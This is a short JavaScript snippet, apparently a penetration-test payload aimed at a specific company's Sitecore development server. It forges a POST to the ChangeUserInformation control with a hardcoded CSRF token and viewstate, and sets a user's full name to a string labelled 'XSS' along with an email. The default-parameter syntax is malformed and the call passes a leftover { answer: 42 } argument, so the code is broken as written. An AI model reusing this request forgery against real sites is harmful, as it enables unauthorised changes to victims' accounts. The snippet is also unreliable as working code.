async function postData(url = 'https://cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', data = {&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=339&__Y=563&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACRkMGViZDgzNS0xZDdkLTQyZTUtYmE4Yi1mMTQ3OTk1YjcxMTkL&__VIEWSTATE=86B2E4CDE5914F45B097338BC21BB43B&__VIEWSTATE=&Fullname=dxpPentetsUserXSS&Email=lr%40moc.moc}) {
  // Default options are marked with *
  const response = await fetch(url, {
    method: 'POST', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'same-origin', // include, *same-origin, omit
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    redirect: 'follow', // manual, *follow, error
    referrerPolicy: 'no-referrer', // no-referrer, *client
    body: data // body data type must match "Content-Type" header
  });
}

postData('https://cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', { answer: 42 })
  .then((data) => {
  });
